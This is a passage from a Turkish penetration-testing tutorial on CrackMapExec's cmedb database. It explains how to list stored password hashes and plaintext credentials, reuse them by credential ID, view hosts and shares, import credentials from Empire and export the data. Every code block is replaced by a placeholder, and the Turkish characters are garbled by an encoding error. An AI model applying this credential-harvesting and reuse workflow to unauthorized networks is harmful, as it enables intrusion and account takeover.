{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


